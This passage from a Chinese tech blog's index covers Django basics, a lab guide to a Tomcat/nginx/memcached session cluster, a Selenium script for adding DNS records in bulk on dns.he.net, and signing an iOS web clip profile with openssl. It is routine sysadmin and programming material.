继承模板，需要写在模板文件的第一行 语法: {% extends '父模板路径' %} 7，HTML转义12345678{{code}}将接收到的code当成普通字符串渲染将接收到的字符串当成HTML代码渲染{% autoescape off %} on 就是当成普通字符串了{{code}}{% endautoescape %} 8，CSRF123456跨站请求伪造 某些恶意网站包含链接、表单、按钮、js，利用登录用户在浏览器中认证，从而攻击服务。 防止CSRF 1、在settings.py文件中的MIDDLEWARE增加'django.middleware.csrf.CsrfViewMiddleware', 2、{% csrf_token %} 在html代码中加上验证。 9，验证码1234作用: 在用户注册、登陆页面的时候使用，为了防止暴力请求，减轻服务器的压力。防止csrf一种方式pip install Pillow 五，Django高级扩展1,静态文件css、js、图片、json文件、字体文件等 123456配置 settings.pySTATICFILES_DIRS=[os.path.join(BASE_DIR,'static')] 2，中间件123456789一个轻量级、底层插件。可以介入Django的请求和响应本质 一个Python类方法:__init__ 不需要传参数，服务器响应第一个请求的时候自动调用，用于确定是否启用该中间件执行的位置自定义中间件 3，上传图片12345678概述: 文件上传时，文件数据存储在request.FILES属性中。 注意: form表单要上传文件是需要加enctype='multipart/form-data' 注意: 上传文件必须是post请求。存储路径 在static目录下创建upfile目录用于存储文件 配置settings.py文件 MDEIA_ROOT=os.path.join(BASE_DIR,r'static\\upfile') 4，分页12","link":"/2020/08/04/python%E4%B9%8BDjango/"},{"title":"tomcat中间件","text":"概述lamplnmp php windows server+ IIS + sqlserver + .net linux + apache/nginx + mysql + php. (LAMP/LNMP) linux + tomcat/jboss/weblogic/websphere/resin + mysql/oracle/db2 + java ======================================================================================= 名词jdk-Java开发包 (jre-Java运行时环境,jvm-Java虚拟机) (跑任何java程序或软件，都需要先安装jdk)j2ee javaee Enterprise Edition - Java企业级版本j2se javase Standard Edition - Java标准版本j2me javame Micro Edition - Java微型版本（用于手机等运算能力/电量有限的设备） j2ee平台由一整套服务，应用程序接口和协议规范组成 Java 2 Platform,Enterprise Edition Java应用程序服务器-application servertomcat (apache软件基金会)jboss wildfly （redhat)weblogic (oracle）websphere (IBM)resin (CAUCHO) ======================================================================================= tomcat apache + tomcat 官网地址: 1http://tomcat.apache.org/ JDK （java development kit） ，JDK是整个JAVA的核心，包括了JAVA运行环境，JAVA工具和基础类库等。 tomcat的安装过程在client1执行Java安装 123456789101112131415java官方下载地址 下载需要oracle账户。https://www.oracle.com/java/technologies/javase/javase-jdk8-downloads.html#license-lightbox1,解压安装jdk tar xf jdk-8u45-linux-x64.tar.gz -C /usr/local/ 重命名mv /usr/local/jdk1.8.0_45 /usr/local/jdk1.8 ls /usr/local/jdk1.8/ 确认解压成功 bin javafx-src.zip man THIRDPARTYLICENSEREADME-JAVAFX.txtCOPYRIGHT jre README.html THIRDPARTYLICENSEREADME.txtdb lib releaseinclude LICENSE src.zip 2,解压安装新版本tomcat 官方下载地址 123https://downloads.apache.org/tomcat/wget https://downloads.apache.org/tomcat/tomcat-9/v9.0.37/bin/apache-tomcat-9.0.37.tar.gz 解压 123tar xf apache-tomcat-8.0.20.tar.gz -C /usr/local/mv /usr/local/apache-tomcat-8.0.20/ /usr/local/tomcat 3,tomcat的环境变量的定义 定义在单个tomcat的启动和关闭程序里 12vim /usr/local/tomcat/bin/startup.sh vim /usr/local/tomcat/bin/shutdown.sh 把startup.sh 和shutdown.sh 这两个脚本里的最前面(但要在#!/bin/bash下在)加上下面一段 12345export JAVA_HOME=/usr/local/jdk1.8/export TOMCAT_HOME=/usr/local/tomcatexport CATALINA_HOME=/usr/local/tomcatexport CLASS_PATH=$JAVA_HOME/bin/lib:$JAVA_HOME/jre/lib:$JAVA_HOME/lib/tool.jarexport PATH=$PATH:/usr/local/jdk1.8/bin:/usr/local/tomcat/bin 启动方法可以把启动文件加入环境变量 123456vim /etc/profile在最后一行加上export PATH=$PATH:/usr/local/tomcat/bin/执行一下profile文件,使配置生效 source /etc/profile 启动： startup.sh 12345678 /usr/local/tomcat/bin/startup.shUsing CATALINA_BASE: /usr/local/tomcatUsing CATALINA_HOME: /usr/local/tomcatUsing CATALINA_TMPDIR: /usr/local/tomcat/tempUsing JRE_HOME: /usr/local/jdk1.8/Using CLASSPATH: /usr/local/tomcat/bin/bootstrap.jar:/usr/local/tomcat/bin/tomcat-juli.jarTomcat started. lsof -i:8080 #端口还是8080 12COMMAND PID USER FD TYPE DEVICE SIZE/OFF NODE NAMEjava 4224 root 44u IPv6 40596 0t0 TCP *:webcache (LISTEN) 使用firefox访问http://IP:8080 可以加到rc.local里做成开机自动启动 echo /usr/local/tomcat/bin/startup.sh &gt;&gt; /etc/rc.local 关闭方法 /usr/local/tomcat/bin/shutdown.sh 家目录路径: /usr/local/tomcat/webapps/ROOT/ tail -f /usr/local/tomcat/logs/catalina.out #启动和关闭时，通过查看这个日志来确认是否OK 修改监听端口123456 vim /usr/local/tomcat/conf/server.xml:69 &lt;Connector port=&quot;80&quot; protocol=&quot;HTTP/1.1&quot; #把8080改成80的话重启后就监听80 connectionTimeout=&quot;20000&quot; redirectPort=&quot;8443&quot; /&gt; 2、进入tomcat安装目录中的conf文件夹，并用记事本打开server.xml文件，然后做出如下修改：（1）修改访问端口，将8080修改为80，80为windows访问http协议的默认端口。修改后的配置如下： 123&lt;Connector port=&quot;80&quot; protocol=&quot;HTTP/1.1&quot; connectionTimeout=&quot;20000&quot; redirectPort=&quot;8443&quot; /&gt; （2）修改访问域名，将原localhost 修改为www.seeyou88.cn 。修改后的配置如下： 12&lt;Host name=&quot;www.seeyou88.cn&quot; appBase=&quot;webapps&quot; unpackWARs=&quot;true&quot; autoDeploy=&quot;true&quot;&gt; （3）在Host标签中添加&lt;Context&gt;标签，内容如下： 12345&lt;Host name=&quot;www.seeyou8.cn&quot; appBase=&quot;webapps&quot; unpackWARs=&quot;true&quot; autoDeploy=&quot;true&quot;&gt; &lt;Valve .../&gt; &lt;Context path=&quot;&quot; docBase=&quot;RainbowChatServer&quot; debug=&quot;0&quot; reloadable=&quot;true&quot;&gt;&lt;/Context&gt; &lt;/Host&gt; 其中：path 指定要访问项目的物理路径，可相对路径，也可绝对路径。 docBase指定浏览器地址栏中要输入的项目名称，空字符串表示不用输入项目名称； 在此处RainbowChatServer，表示的是要访问的项目是webapps 下的RainbowChatServer 项目。 测试后再改回8080端口 总结一个小错误:在执行/usr/local/tomcat/bin/shutdown.sh关闭时，如果有下面的错误信息……Jul 28, 2017 11:56:26 AM org.apache.catalina.startup.Catalina stopServerSEVERE: Could not contact localhost:8005. Tomcat may not be running.Jul 28, 2017 11:56:26 AM org.apache.catalina.startup.Catalina stopServerSEVERE: Catalina.stop:…… 解决方法: 123456789 vim /usr/local/jdk1.8/jre/lib/security/java.security 117 securerandom.source=file:/dev/urandom #找到这一行，把random改成urandom再kill杀掉进程重启测试/dev/random #用这个设备产生随机数，需要借助外部中断事件（如，动鼠标，敲键盘等）。这样的话在产生大量随机数时有可能会ang住/dev/urandom #相对/dev/random来说，不需要借助外部中断事件，产生大量随机数比较快 目录布署 mkdir /usr/local/tomcat/webapps/abc把abc目录与ROOT同级或者是在ROOT的下一级都是可行的 12345678910vim /usr/local/tomcat/webapps/abc/time.jsp&lt;html&gt;&lt;body&gt;&lt;center&gt;&lt;H1&gt;&lt;%=new java.util.Date()%&gt;&lt;/H1&gt;&lt;/center&gt;&lt;/body&gt;&lt;/html&gt; 访问URL：http://192.168.224.10/abc/time.jsp 可以看到运行结果。 安装完tomcat后，就可以将开发的java应用装上进行测试了因为java开发的开源应用非常少，并且很多不支持较新版本的tomcat，我们这里又是实验环境，所以这里简单安装一个jspxcms让大家看下效果 一个开源的java cms系统jspxcms（java内容管理系统）软件包：jspxcms-5.2.4-release.zip 1http://www.jspxcms.com/download/ (新版的安装方式会有些不同，可以参考Jspxcms安装手册.pdf) 步骤： 1.部署 1234567rm /usr/local/tomcat/webapps/ROOT/* -rf #解压之前先删除原来家目录里的文件unzip jspxcms-5.2.4-release.zip -d /usr/local/tomcat/webapps/ #(解压jspxcms).yum install mariadb mariadb-server -ysystemctl restart mariadb.servicesystemctl status mariadb.servicesystemctl enable mariadb.service 2,去mysql建一个库，进行授权 1234 mysqlMariaDB [(none)]&gt; create database jspxcms;MariaDB [(none)]&gt; grant all on jspxcms.* to 'li'@'localhost' identified by '123';MariaDB [(none)]&gt; flush privileges; 3,访问http://IP:8080/按照它的步骤进行安装 数据库名：jspxcms 数据库用户名：li 数据库密码: 123 是否创建数据库:否 管理员密码：123 4,重启tomcat后，再使用下面路径访问就可以了（不能通过Xshell启动，要在VMware里面启动）(新版tomcat已经可以通过xshell启动了) /usr/local/tomcat/bin/shutdown.sh /usr/local/tomcat/bin/startup.sh 前台访问地址:http://IP:8080/后台访问地址:(需要admin用户和其密码登录才有权限）http://IP:8080/cmscp/index.do 部署shop ls $software/shopsp.sql sp.war 简单过程 rm /usr/local/tomcat/webapps/ROOT/* -rf 把sp.war拷贝到/usr/local/tomcat/webapps/下 然后客户端浏览器使用http://IP/sp来访问 cat sp.sql | mysql #导入应用需要的库和表 访问：http://192.168.224.11:8080/sp =================================================================== 如果一台tomcat顶不住，怎么办?三个办法:1，微调(内存，并发数，IO，网络，内核参数等)2，换更好的硬件，成本高，提升仍然有限3，架构 （单打独斗转为团队作战） 避免单点故障 以前apache+tomcat+mod_jk进行整合 ​ apache1 apache2 mod_jk mod_jk | | |---------| | | tomcat1 tomcat2 ======================================================== 现在nginx替代apache，也不需要mod_jk模块 client dns www.itjiangshi.com ​​ nginx1 nginx2 (处理静态)​​ ip_hash​​ tomcat1 tomcat2 (处理动态) RR​​ 1.jsp​ 2.jsp​ 3.jsp​ 4.jsp ​​ dns​​ nginx1 nginx2​​ squid1 squid2 (处理静态)​​ tomcat1 tomcat2 (处理动态) RR​​ memcached1 memcached2​​ mariadb1 mariadb2 由于http是无状态的协议，你访问了页面A，然后在访问B，http无法确定这2个访问来自一个人，因此要用cookie或session来跟踪用户，根据授权和用户身份来显示不同的页面。比如用户A登陆了，那么能看到自己的个人信息，而B没登陆，无法看到个人信息。还有A可能在购物，把商品放入购物车，此时B也有这个过程，你无法确定A，B的身份和购物信息，所以需要一个session ID来维持这个过程。 cookie是服务器发给客户端，并且保持在客户端的一个文件，里面包含了用户的访问信息（账户密码等），可以手动删除或设置有效期，在下次访问的时候，会返给服务器。注意：cookie可以被禁用，所以要想其他办法，这就是session。比如：你去商场购物，商场会给你办一张会员卡，下次你来出示该卡，会有打折优惠.该卡可以自己保存（cookie），或是商场代为保管，由于会员太多，个人需要保存卡号信息（session ID) 一、Session Replication 方式管理 (即session复制) 简介：将一台机器上的Session数据广播（组播)复制到集群中其余机器上 使用场景：机器较少，网络流量较小 优点：实现简单、配置较少、当网络中有机器Down掉时不影响用户访问 缺点：广播式复制到其余机器有一定廷时，带来一定网络开销 ​​ 300 500​ 张三 李四​​ 今天满600块就返100块 二、Session Sticky 方式管理 简介：即粘性Session、当用户访问集群中某台机器后，强制指定后续所有请求均落到此机器上 使用场景：机器数适中、对稳定性要求不是非常苛刻 优点：实现简单、配置方便、没有额外网络开销 缺点：网络中有机器Down掉时、用户Session会丢失、容易造成单点故障 三、缓存集中式管理 简介：将Session存入分布式缓存集群中的某台机器上，当用户访问不同节点时先从缓存中拿Session信息 使用场景：集群中机器数多、网络环境复杂 优点：可靠性好 缺点：实现复杂、稳定性依赖于缓存的稳定性、Session信息放入缓存时要有合理的策略写入 300 500 张三 李四 会员卡 今天满600块就返100块 ======================================================================================= 部署tomcat集群下面就配置nginx+tomcat+msm(memcached-session-manager)做综合应用.这里因为有负载均衡，为了让tomcat1和2能够共享session，所以使用msm 下图中:192.168.2.x/24网络我模拟外网(这里我用kvm的桥接来模拟)192.168.224.0/24网络我模拟内网(这里我用kvm的virbr1网络来模拟) nginx解析静态页面并将动态负载均衡调度给后面多个tomcattomcat解析java动态程序 client 192.168.2.x | | 192.168.2.51 nginx | 192.168.224.10 | |－－－－－－－－－－| tomcat1 tomcat2 192.168.224.11 192.168.224.12 | | |------------------| | | 192.168.224.13 memcached服务器 实验前准备:1,主机名三步绑定192.168.224.10 nginx.cluster.com192.168.224.11 tomcat1.cluster.com192.168.224.12 tomcat2.cluster.com192.168.224.13 memcached.cluster.com 创建3台centos容器安装 1234567891011创建网络docker network create -d bridge mytomcatcentos1容器tomcat1docker run -it --restart=always --privileged=true --name centos1 -p 8080:8080 -h centos1 --network mytomcat -v /etc/localtime:/etc/localtime -d centos:7 /usr/sbin/initcentos2容器tomecat2docker run -it --restart=always --privileged=true --name centos2 -p 8090:8080 -h centos2 --network mytomcat -v /etc/localtime:/etc/localtime -d centos:7 /usr/sbin/initcentos3容器memcacheddocker run -it --restart=always --privileged=true --name centos3 -p 11211:11211 -h centos3 --network mytomcat -v /etc/localtime:/etc/localtime -d centos:7 /usr/sbin/init 分别进去容器测试是否正常ping通 1234567891011121314151617181920212223docker exec -it centos1 /bin/bashdocker exec -it centos2 /bin/bashdocker exec -it centos3 /bin/bash安装相关命令yum provides ipyum install -y iproute net-tools vimping centos1ping centos2ping centos3vim /etc/hosts增加172.19.0.2 centos1 centos1.com172.19.0.3 centos2 centos2.com172.19.0.4 centos3 centos3.com 给tomcat容器放入软件 123456docker cp jdk-8u45-linux-x64.tar.gz centos1:/root/docker cp jdk-8u45-linux-x64.tar.gz centos2:/root/docker cp apache-tomcat-8.0.20.tar.gz centos1:/root #亲测tomcat9.0的不能和msm配置有冲突。docker cp apache-tomcat-8.0.20.tar.gz centos2:/rootdocker cp msm centos1:/root/docker cp msm centos2:/root/ 开始部署 2,时间同步3,关闭iptables,selinux4,配置yum 第一步:1，在192.168.224.10上安装nginx(需要epel源) yum install epel-release -y yum install nginx -y 2，配置nginx cat /etc/nginx/nginx.conf |grep -v '#' 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061user nginx;worker_processes auto;error_log /var/log/nginx/error.log;pid /run/nginx.pid;include /usr/share/nginx/modules/*.conf;events { worker_connections 1024;}http { log_format main '$remote_addr - $remote_user [$time_local] &quot;$request&quot; ' '$status $body_bytes_sent &quot;$http_referer&quot; ' '&quot;$http_user_agent&quot; &quot;$http_x_forwarded_for&quot;'; access_log /var/log/nginx/access.log main; sendfile on; tcp_nopush on; tcp_nodelay on; keepalive_timeout 65; types_hash_max_size 2048; include /etc/nginx/mime.types; default_type application/octet-stream; include /etc/nginx/conf.d/*.conf;upstream tomcat { server 192.168.224.11:8080 weight=1; server 192.168.224.12:8080 weight=1;} server { listen 80 default_server; listen [::]:80 default_server; server_name 192.168.2.51; root /usr/share/nginx/html; include /etc/nginx/default.d/*.conf; location ~ .*\\.jsp$ { proxy_pass http://tomcat; proxy_set_header Host $host; proxy_set_header X-Forwarded-For $remote_addr; } error_page 404 /404.html; location = /40x.html { } error_page 500 502 503 504 /50x.html; location = /50x.html { } }} systemctl start nginx systemctl status nginx systemctl enable nginx lsof -i:80 第二步: 在192.168.224.11和192.168.224.12上安装两台tomcat（过程省略,建议tomcat重新安装，因为如果前面tomcat安装了jspxcms这个应用的话，会对后面的测试造成影响) tomcat1和tomcat2上把下面的软件包都scp到/usr/local/tomcat/lib/目录下 $software/msm/ #这些软件包是针对tomcat8的，如果你是tomcat6或者tomcat7你需要自行网上下载,tomcat9也是不行。 123456 ls $software/msmasm-3.2.jar msm-kryo-serializer-1.8.1.jarkryo-1.04.jar reflectasm-1.01.jarmemcached-session-manager-1.8.1.jar serializers-0.11.jarmemcached-session-manager-tc8-1.8.1.jar spymemcached-2.11.1.jarminlog-1.2.jar cp *.jar /usr/local/tomcat/lib Jar包的作用是进行Class文件的打包管理。里面包含class文件。 部署msm第三步:在tomcat部署msm在tomcat1和tomcat2上操作 vim /usr/local/tomcat/conf/context.xml (在此文件的&lt;Context&gt;和&lt;/Context&gt;里面加上下面一段） 123456789&lt;Manager className=&quot;de.javakaffee.web.msm.MemcachedBackupSessionManager&quot; memcachedNodes=&quot;n1:192.168.224.13:11211&quot; #这里的ip为memcached服务器的IP,如果有多个memcached服务器，用逗号隔开 lockingMode=&quot;auto&quot; sticky=&quot;false&quot; requestUriIgnorePattern= &quot;.*\\.(png|gif|jpg|css|js)$&quot; sessionBackupAsync= &quot;false&quot; sessionBackupTimeout= &quot;100&quot; copyCollectionsForSerialization=&quot;true&quot; transcoderFactoryClass=&quot;de.javakaffee.web.msm.serializer.kryo.KryoTranscoderFactory&quot; /&gt; 并把两台tomcat分别启动（如果你先前启动了要重启) /usr/local/tomcat/bin/shutdown.sh /usr/local/tomcat/bin/startup.sh lsof -i:8080 第四步:在192.168.224.13上安装并启动memcached(本地yum源就OK) 1234yum install memcached -ysystemctl start memcached.service systemctl status memcached.servicesystemctl enable memcached.service lsof -i:11211 第五步:我这里nginx,tomcat1,tomcat2是合起来做一个应用，所以它们的家目录里的内容应该是一样的，如何让一个应用内容在它们那里一致?方法1:远程实时rsync同步方法2:drbd,共享存储或分布式存储(后面课程会讲,但现在也可以使用nfs来模拟共享存储) 在nginx的家目录/usr/share/nginx/html里,并且在tomcat1和tomcat2的家目录/usr/local/tomcat/webapps/ROOT/里建立一个测试文件（如果有nfs做共享存储，则只需要建立一次就可以了) 12345 vim session.jspweb1SessionID:&lt;%=session.getId()%&gt; &lt;BR&gt;SessionIP:&lt;%=request.getServerName()%&gt; &lt;BR&gt;SessionPort:&lt;%=request.getServerPort()%&gt; 第六步:确认nginx和tomcat1和tomcat2和memcached都是启动状态，客户端使用firefox来测试 测试一：分别在nginx，tomcat1，tomcat2的家目录中创建文件1.html，内容为标识本机的信息.用来测试集群环境下的目标机器。访问http://192.168.2.51/1.html浏览器会显示字符串’nginx’,因为在nginx的转发规则中，只有JSP才会被转到后台tomcat服务器Nginx document root:/usr/share/nginx/htm 测试二：分别在nginx，tomcat1，tomcat2的家目录中创建文件1.jsp，内容 为机器名称.用来测试集群环境下的目标机器。访问http://192.168.2.51/1.jsp 浏览器会显示字符串’tomcat1’，‘tomcat2’ 交替显示。因为在nginx的转发规则中，所有JSP请求都会被转发到后台。 测试三:http://192.168.2.51/session.jsp #不断F5刷新，sessionID是不变的 curl http://192.168.2.51/session.jsp #不要使用这种方式来测，这样测试session id是会变的（curl不能像firefox那样存放session id)，但也会存储到memcache中 在memcache服务器上进行下面的操作 1234echo &quot;stats cachedump 3 0&quot; | nc 192.168.224.13 11211 &gt; /tmp/session.txt cat /tmp/session.txt |head -1 #导出的第一行的session ID就等于上面页面刷新时的session id,说明session id 确实存放在memcache里 ITEM validity:A8F853F36B9931DD5ADF51DFB806A0CF-n1 [20 b; 1442225217 s] 缓存内容解释：ITEM validity:B671A8EAB6A358CD3FB73DA58C76685B-n120 b：Session过期时间1545374604 s：访问时间 测试四： 客户端自己清除缓存 清除浏览器缓存，session ID会发生改变 服务端清空缓存的方法：方法一：交互式命令模式 12345[root@client3 tmp]# nc 192.168.224.13 11211&gt;flush_all&gt;quit&gt;[root@client3 tmp]# 方法二：命令行模式 1echo &quot;flush_all&quot; | nc localhost 11211 这时候去浏览器查看.session ID也会发生改变。","link":"/2020/08/03/tomcat%E4%B8%AD%E9%97%B4%E4%BB%B6jsp/"},{"title":"批量添加dns域名解析","text":"工作中有时候会遇到很多域名需要转移。转移到这家比较老牌的域名解析服务商。但是这家只能一条一条添加域名和解析，就比较麻烦；于是就写了下批量添加的程序，解放下双手。 1.编写的批量添加dns.he.net网站域名并解析。123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152# -*- coding: UTF-8 -*-from selenium import webdriverimport time,os,re,sysfrom selenium import webdriverfrom selenium.webdriver.common.by import Byfrom selenium.webdriver.support import expected_conditions as ECfrom selenium.webdriver.support.wait import WebDriverWaitfrom selenium.webdriver.common.action_chains import ActionChainsfrom sheen import Strfrom selenium.webdriver.common.keys import Keyschromedriver=r&quot;C:\\Program Files\\Google\\Chrome\\Application\\chromedriver.exe&quot;#针对编码格式的操作options = webdriver.ChromeOptions()options.add_argument(&quot;lang=zh_CN.UTF-8&quot;)#options.add_argument('--headless')#声明浏览器browser = webdriver.Chrome(chromedriver,options=options)url = r&quot;https://dns.he.net/&quot;#username=&quot;365dl1&quot;#password=r&quot;helloworld&quot;def main(): while True: xuanzhe=input(&quot;选择添加dns网站，1 为dns.he.net, 2 为退出:\\n&quot;) if xuanzhe == &quot;1&quot;: addDns() elif xuanzhe == &quot;2&quot;: print(&quot;退出&quot;) sys.exit() else: print(&quot;退出&quot;) sys.exit() breakdef addDns(): # get打开指定的url，传入要打开的url, browser.get(url) # 通过find_element_by_name获取到网页标签，send_keys()输入内容,在搜索栏输入python username = input(&quot;请输入dns.he.net的账号名: \\n&quot;) password = input(&quot;请输入%s账号的密码\\n&quot; %(username)) cname = input(&quot;请输入cname地址 如: site.365ok365ok.com\\n&quot;) browser.find_element_by_name(&quot;email&quot;).send_keys(username) browser.find_element_by_name(&quot;pass&quot;).send_keys(password) #登录 browser.find_element_by_xpath(&quot;//*[@id='_loginbutton']&quot;).click() time.sleep(3) #点击free dns browser.find_element_by_xpath(&quot;//*[@id='navigation']/div[3]/div[2]/a[3]&quot;).click() time.sleep(1) #domain = with open(&quot;domian.txt&quot; , &quot;r&quot; , encoding=&quot;utf-8&quot;) as f: # print(f.read()) path = &quot;domian.txt&quot; n = int(input(&quot;现在是该账号的第几条域名，第二条请输入 2\\n&quot;)) with open(path, &quot;r&quot;) as f: while True: lineInfo = f.readline() if len(lineInfo) &lt; 3: break #新增域名 browser.find_element_by_xpath(&quot;//*[@id='navigation']/div[2]/ul/li[1]/a&quot;).click() #点击域名框 time.sleep(2) #browser.find_element_by_xpath(&quot;// *[ @ id = '_name']&quot;).click() #输入域名 browser.find_element_by_xpath(&quot;// *[ @ id = '_name']&quot;).send_keys(lineInfo) #不定位元素直接回车 ActionChains(browser).send_keys(Keys.ENTER).perform() #browser.find_element_by_xpath(&quot;// *[ @ id = '_name']&quot;).send_keys(Keys.ENTER) time.sleep(5) #input(&quot;请按回车提交域名:&quot;) # print(&quot;第一次添加域名一般不用手动点击提交域名按钮，后面有时候有需要提交&quot;) # shou = input(&quot;是否手动提交域名y是n为不是，输入其他表示域名有误不能添加，请联系服务商。\\n&quot;) # if shou == &quot;y&quot;: # #提交域名 # browser.find_element_by_xpath(&quot;//*[@id='add_zone']/form/input[3]&quot;).click() # elif shou == &quot;n&quot;: # pass # else: # print(&quot;域名有误， 退出程序&quot;) # sys.exit() time.sleep(5) #进入新增域名编辑页面 time.sleep(2) list_xpath = &quot;//*[@id='domains_table']/tbody/tr[{}]/td[2]&quot;.format(n) browser.find_element_by_xpath(list_xpath).click() print(&quot;已添加域名 &quot;, lineInfo) #browser.find_element_by_name(lineInfo).click() time.sleep(2) #新增alias别名信息 browser.find_element_by_xpath(&quot;//*[@id='jsddm']/li[4]/a&quot;).click() time.sleep(1) #点击name browser.find_element_by_xpath(&quot;//*[@id='_name' and @name='Name']&quot;).click() #输入 browser.find_element_by_xpath(&quot;//*[@id='_name' and @name='Name']&quot;).send_keys(&quot;@&quot;) #点击Hostname browser.find_element_by_xpath(&quot;//*[@id='_content' and @name='Content']&quot;).click() browser.find_element_by_xpath(&quot;//*[@id='_content' and @name='Content']&quot;).send_keys(&quot;www.&quot; + lineInfo) #提交 ActionChains(browser).send_keys(Keys.ENTER).perform() #browser.find_element_by_xpath(&quot;//*[@id='_content' and @name='Content']&quot;).send_keys(Keys.ENTER) # if shou == &quot;y&quot;: # # browser.find_element_by_xpath(&quot;//*[@id='_hds']&quot;).click() # else: # pass time.sleep(2) browser.find_element_by_xpath(&quot;//*[@id='jsddm']/li[3]/a&quot;).click() time.sleep(1) #点击后输入www browser.find_element_by_xpath(&quot;//*[@id='_name']&quot;).click() browser.find_element_by_xpath(&quot;//*[@id='_name']&quot;).send_keys(&quot;www&quot;) browser.find_element_by_xpath(&quot;//*[@id='_content']&quot;).click() browser.find_element_by_xpath(&quot;//*[@id='_content']&quot;).send_keys(cname) #TTL设置1小时 browser.find_element_by_xpath(&quot;//*[@id='_ttl']&quot;).click() browser.find_element_by_xpath(&quot;// *[ @ id = '_ttl']/option[7]&quot;).click() #提交 time.sleep(1) browser.find_element_by_xpath(&quot;//*[@id='_hds']&quot;).click() time.sleep(3) print(&quot;已添加域名%s,且已解析 &quot; %(lineInfo)) browser.find_element_by_xpath(&quot;//*[@id='navigation']/div[3]/div[2]/a[3]&quot;).click() time.sleep(3) n += 1if __name__ == &quot;__main__&quot;: main() #os.system(&quot;pause&quot;) time.sleep(3) browser.close() browser.quit() 2.打包成exe可执行文件123456789101112131415161718192021222324PyInstaller -F 添加dns.py Pyinstaller -F &quot;2,添加dns.py&quot; -i zidonghua\\tu\\favicon.icoPyInstaller 和 cx_Freeze 服务于相同的目的。Mac 使用 py2app，PyInstaller 或 cx_Freeze。pyinstaller xxx.py注：终端需切换至xxx.py文件所在目录下。常用可选项及说明：-F：打包后只生成单个exe格式文件；-D：默认选项，创建一个目录，包含exe文件以及大量依赖文件；-c：默认选项，使用控制台(就是类似cmd的黑框)；-w：不使用控制台；-p：添加搜索路径，让其找到对应的库；-i：改变生成程序的icon图标。","link":"/2023/11/01/selenlium%E6%89%B9%E9%87%8F%E6%B7%BB%E5%8A%A0dns%E5%9F%9F%E5%90%8D/"},{"title":"python之Selenium模块的使用","text":"嗨，请准确无误地输入密码查看哟！ ","link":"/2023/11/01/python%E4%B9%8BSelenium%E6%A8%A1%E5%9D%97/"},{"title":"win10为app生成ios webclip免签","text":"win10为app生成ios webclip免签win10 下载工具 baidu或google 搜索iphone配置实用工具，下载安装 会出现打不开情况 百度搜索解决方案 一共要复制两个文件过去. 常见问题完美解决win10下iphone配置实用工具找不到“apple mobile device support”（位置即是安装路径所在位置，下面是默认安装位置）1、进入如下目录“C:\\Program Files (x86)\\Common Files\\Apple\\Mobile Device Support\\”复制MobileDevice.dll到“D:\\iPhone 配置实用工具&quot;下2、进入如下目录“C:\\Program Files (x86)\\Common Files\\Apple\\Apple Application Support”复制SQLite3.dll到“D:\\iPhone 配置实用工具”下 开始配置1234graph LRA[新建描述文件]--&gt;B[填写名称]--&gt;C[填写标识符]--&gt;D[填写组织]--&gt;E[描述]--&gt;F[同意信息]--&gt;G[安全性配置]H[web clip]--&gt;I[标签]--&gt;J[url]--&gt;k[图标]--&gt;L[预设原图图标]--&gt;N[全屏幕]O[导出]--&gt;P[安全性无] 此时会得到一个.mobilconfig结尾的文件 使用ssl证书签名 无所谓什么域名的ssl证书，只有没过期就行， 导出为apache证书，上传到linux服务器，使用openssl key crt pem 生成已签名配置文件 生成后去下载描述文件就会是验证的文件，1openssl smime -sign -in unsigned.mobileconfig -out signed.mobileconfig -signer mbaike.crt -inkey mbaike.key -certfile ca-bundle.pem -outform der -nodetach 命令解释,用法 -sign -in 把原本unsigned.mobilconfig 文件 生成签名的文件signed.mobileconfig， -signer 是之前导出的apache证书，mabike.crt -inkey 就是之前生成证书的*.key文件， -certfile 就是证书的ca_bundle.crt 文件，把后缀crt改下pem 不改也可以 , -outform der 输出格式为der -ondetach 用不透明的签名 1234567OpenSSL命令---smimeopenssl smime [-encrypt] [-decrypt] [-sign] [-verify] [-pk7out] [-nointern] [-nosigs] [-noverify] [-nocerts] [ -nodetach] [-noattr] [-binary] [-in file] [-inform SMIME|PEM|DER] [-certfile file] [-signer file] [-recip file] [-passin arg] [-inkey file] [-keyform PEM |ENGINE] [-out file] [-outform SMIME|PEM|DER] [-content file] [-to addr] [-from ad] [-subject s] [-text] [-CApath directory] [-CAfile filename] [-crl_check] [-crl_check_all] [-indef] [-noindef] [-stream] [-rand file(s)] [-md digest] [cert.pem…] [-des] [-des3] [-rc2-40] [-rc2-64] [-rc2-128] 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687选项说明：-encrypt：用给定的接受者的证书加密邮件信息。输入文件是一个消息值，用于加密。输出文件是一个已经被加密了的MIME格式的邮件信息。-decrypt：用提供的证书和私钥值来解密邮件信息值。从输入文件中获取到已经加密了的MIME格式的邮件信息值。解密的邮件信息值被保存到输出文件中。-sign：用提供的证书和私钥值来签名邮件信息值。输入文件是一个消息值，用于签名。输出文件是一个已经被签名了的MIME格式的邮件信息。-verify：验证已经签名了的邮件信息值。输入文件和输出文件都是已经签名了的邮件信息值。同时支持清除文本以及不透明的签名。-pk7out：将一个PEM格式的输入信息转换为PKCS#7结构。-nointern：对签名者来说，不从消息中查找证书。-nosigs：不去验证签名值。-noverify：不去验证签名者的证书信息。-nocerts：当签名的时候不包含签名者的证书信息值。-nodetach：用不透明的签名。-binary：不转换二进制消息到文本消息值。-in file：输入消息值，它一般为加密了的以及签名了的MINME类型的消息值。-inform SMIME|PEM|DER：输入消息的格式。一般为SMIME|PEM|DER三种。默认的是SMIME。-certfile filename：添加filename中所有的证书信息值。-signer file：一个签名证书，当签名或放弃一个签名数据时使用。这个选项可以被用多次。如果一个消息已经被验证并验证通过，则将签名者的证书放到file中。-recip file：存放提供者的证书，主要用于解密消息值。这个证书必须匹配多个提供者的消息。-passin arg：私钥保护口令来源。-inkey file：私钥存放地址，主要用于签名或解密数据。这个私钥值必须匹配相应的证书信息。如果这个选项没有被指定，私钥必须包含到证书路径中（-recip、-signer）。-keyform PEM |ENGINE：私钥格式。一般为PEM 、ENGINE格式。-out file：已经被解密或验证通过的数据的保存位置。-outform SMIME|PEM|DER：输出格式。一般为SMIME、PEM、DER三种。默认的格式是SMIME。-content file：包含分离的上下文路径，它仅仅只能用于verify操作。-to addr：有关的邮件信息值头部。接收的地址。-from ad：有关的邮件信息值头部。发送的地址。-subject 